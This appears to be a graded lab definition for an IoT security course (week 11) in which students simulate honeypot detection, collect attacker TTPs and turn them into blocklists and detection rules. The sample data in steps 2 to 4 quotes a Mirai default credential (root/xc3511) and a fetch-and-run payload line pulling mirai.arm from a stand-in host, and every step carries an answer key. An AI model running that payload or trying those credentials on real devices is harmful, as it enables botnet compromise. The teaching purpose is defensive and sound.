@@ -1,0 +1,165 @@
+lab_id: iot-security-week11
+title: "W11 — IoT 허니팟: 상호작용 탐지·공격자 TTP 수집·위협 인텔 환류"
+version: ai
+course: iot-security
+week: 11
+description: |
+  IoT 능동 방어. 허니팟 상호작용 고신뢰 탐지(HONEYPOT_TRIGGERED), 공격자 TTP(자격·페이로드) 수집
+  (TTP_CAPTURED), 인텔을 차단·룰로 환류(INTEL_APPLIED), 종합(Assessment).
+  가짜 IoT로 공격자 유인 — 접촉=공격(거의 오탐 0). 격리 필수.
+difficulty: medium
+duration_minutes: 120
+audience: IoT 보안 (11주차)
+prerequisites:
+  - el34 호스트 접속 (`ssh ccc@{{TARGET_IP}}`, 비밀번호 `1`)
+  - GPU Ollama 도달 — gemma3:4b
+  - W11 강의안 정독 — §0.5(허니팟·TTP·환류·격리)
+objectives:
+  - "GPU 헬스체크(GEN_OK)"
+  - "허니팟 상호작용 탐지(HONEYPOT_TRIGGERED)"
+  - "공격자 TTP 수집(TTP_CAPTURED)"
+  - "인텔 차단·룰 환류(INTEL_APPLIED)"
+  - "종합(Assessment)"
+pass_threshold: 0.6
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## STEP 1 — GPU 헬스체크 → GEN_OK
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Reply with the word ready.","stream":false,"options":{"num_predict":10}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
+      ```
+      ✅ 마지막 줄 `GEN_OK`.
+    answer: |
+      ready
+      GEN_OK
+    answer_detail: "GPU 응답 확인."
+    verify:
+      type: output_contains
+      expect: GEN_OK
+      field: stdout
+
+  - order: 2
+    instruction: |
+      ## STEP 2 — 허니팟 상호작용 → HONEYPOT_TRIGGERED
+      > **🎯 목표:** 가짜 IoT 장치 접촉을 고신뢰 공격 신호로 탐지.
+      > **개념:** 정상 사용자는 안 건드림 → 접촉=공격(거의 오탐 0).
+      ```bash
+      python3 - <<'PY'
+      # 허니팟(가짜 IP 카메라) 접속 로그
+      honeypot="decoy-camera(192.168.99.50)"
+      connections=[{"src":"185.220.101.42","action":"telnet login attempt admin/admin"},
+                   {"src":"91.234.x.x","action":"GET /shell?cmd=wget..."},
+                   {"src":"185.220.101.42","action":"try 60 default credentials"}]
+      # 허니팟엔 정상 트래픽이 없으니 모든 접촉이 공격
+      attackers={c["src"] for c in connections}
+      print(f"honeypot {honeypot}: {len(connections)} interactions from {len(attackers)} sources")
+      for c in connections[:3]: print(f"  {c['src']}: {c['action'][:40]}")
+      # 접촉이 있으면 고신뢰 공격 탐지(정상 트래픽 없음)
+      print("HONEYPOT_TRIGGERED" if connections else "QUIET")
+      PY
+      ```
+      ✅ 마지막 줄 `HONEYPOT_TRIGGERED` (가짜 카메라에 telnet 로그인·명령 주입 시도 = 공격).
+      🔎 허니팟엔 정상 트래픽이 없다. telnet admin/admin·명령 주입 접촉은 모두 공격(봇넷 스캔). 거의 오탐 0.
+    answer: |
+      honeypot decoy-camera(192.168.99.50): 3 interactions from 2 sources
+        185.220.101.42: telnet login attempt admin/admin
+        91.234.x.x: GET /shell?cmd=wget...
+        185.220.101.42: try 60 default credentials
+      HONEYPOT_TRIGGERED
+    answer_detail: "허니팟 접촉을 고신뢰 공격 신호로 탐지 → HONEYPOT_TRIGGERED."
+    verify:
+      type: output_contains
+      expect: HONEYPOT_TRIGGERED
+      field: stdout
+
+  - order: 3
+    instruction: |
+      ## STEP 3 — TTP 수집 → TTP_CAPTURED
+      > **🎯 목표:** 공격자의 자격·페이로드·C2를 수집.
+      > **개념:** 관찰한 수법이 실제 방어의 재료.
+      ```bash
+      python3 - <<'PY'
+      # 허니팟에서 관찰한 공격자 행동
+      observed=[{"type":"credential","value":"admin/admin"},
+                {"type":"credential","value":"root/xc3511"},   # Mirai 기본 자격
+                {"type":"payload","value":"wget http://185.evil/mirai.arm; chmod +x; ./mirai.arm"},
+                {"type":"c2","value":"185.evil.c2:23"}]
+      ttp={"credentials":[o["value"] for o in observed if o["type"]=="credential"],
+           "payloads":[o["value"] for o in observed if o["type"]=="payload"],
+           "c2":[o["value"] for o in observed if o["type"]=="c2"]}
+      for k,v in ttp.items(): print(f"  {k}: {v}")
+      # 자격·페이로드·C2를 모두 수집하면 TTP 확보
+      print("TTP_CAPTURED" if all(ttp.values()) else "PARTIAL")
+      PY
+      ```
+      ✅ 마지막 줄 `TTP_CAPTURED` (기본 자격·Mirai 페이로드·C2 주소 수집).
+      🔎 시도된 자격(Mirai 기본 자격 root/xc3511)·페이로드(mirai.arm 다운로드)·C2 주소. 실제 방어의 인텔.
+    answer: |
+      credentials: ['admin/admin', 'root/xc3511']
+      payloads: ['wget http://185.evil/mirai.arm; chmod +x; ./mirai.arm']
+      c2: ['185.evil.c2:23']
+      TTP_CAPTURED
+    answer_detail: "공격자 TTP(자격·페이로드·C2) 수집 → TTP_CAPTURED."
+    verify:
+      type: output_contains
+      expect: TTP_CAPTURED
+      field: stdout
+
+  - order: 4
+    instruction: |
+      ## STEP 4 — 인텔 환류 → INTEL_APPLIED
+      > **🎯 목표:** 수집 인텔을 차단 목록·탐지 룰로 환류.
+      > **개념:** 허니팟 하나가 여러 방어 개선으로.
+      ```bash
+      python3 - <<'PY'
+      ttp={"credentials":["root/xc3511"],"payloads":["mirai.arm download"],"c2":["185.evil.c2:23"],"src":["185.220.101.42"]}
+      applied=[]
+      # 공격 IP·C2 → 차단 목록
+      for ip in ttp["src"]+["185.evil.c2"]: applied.append(("blocklist", f"block {ip}"))
+      # 페이로드 → 탐지 룰(agent-ir W09)
+      for p in ttp["payloads"]: applied.append(("detection_rule", f"alert on: {p}"))
+      # 자격 → 우리 장치 방어(약한 자격 금지)
+      for c in ttp["credentials"]: applied.append(("credential_policy", f"forbid default: {c}"))
+      for target,action in applied: print(f"  [{target}] {action}")
+      kinds={t for t,_ in applied}
+      print("INTEL_APPLIED" if {"blocklist","detection_rule","credential_policy"}.issubset(kinds) else "PARTIAL")
+      PY
+      ```
+      ✅ 마지막 줄 `INTEL_APPLIED` (IP→차단, 페이로드→탐지 룰, 자격→정책 환류).
+      🔎 공격 IP·C2→차단 목록, 페이로드→탐지 룰, 시도 자격→우리 장치 금지 목록. 허니팟 인텔이 여러 방어로.
+    answer: |
+      [blocklist] block 185.220.101.42
+      [blocklist] block 185.evil.c2
+      [detection_rule] alert on: mirai.arm download
+      [credential_policy] forbid default: root/xc3511
+      INTEL_APPLIED
+    answer_detail: "인텔을 차단·탐지 룰·정책으로 환류 → INTEL_APPLIED."
+    verify:
+      type: output_contains
+      expect: INTEL_APPLIED
+      field: stdout
+
+  - order: 5
+    instruction: |
+      ## STEP 5 — 종합 → Assessment
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Write a short note for W11 on IoT honeypots. Findings: interactions with a decoy camera were high-confidence attack signals with near-zero false positives (HONEYPOT_TRIGGERED), attacker TTPs (default credentials, Mirai payload, C2) were captured (TTP_CAPTURED), and the intel was fed back into blocklists, detection rules, and credential policy (INTEL_APPLIED). Explain that honeypots give near-zero-FP detection, threat intel, and early warning, and stress isolating honeypots. Start with exactly Assessment on its own line.","stream":false,"options":{"num_predict":330}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
+      ```
+      ✅ 출력에 `Assessment`.
+      🔎 정리: IoT 허니팟=거의 오탐 없는 탐지+위협 인텔+조기 경보. 인텔을 방어로 환류. 격리 필수.
+      다음 주(W12)는 **OT/SCADA 기초**.
+    answer: |
+      Assessment
+      IoT honeypots give near-zero-FP detection, threat intel (credentials, payloads, C2), and early warning of campaigns.
+      Feed the intel into blocklists and detection rules, and always isolate honeypots.
+    answer_detail: "W11 IoT 허니팟 종합(Assessment). 탐지·TTP·환류·격리."
+    verify:
+      type: output_contains
+      expect: Assessment
+      field: stdout
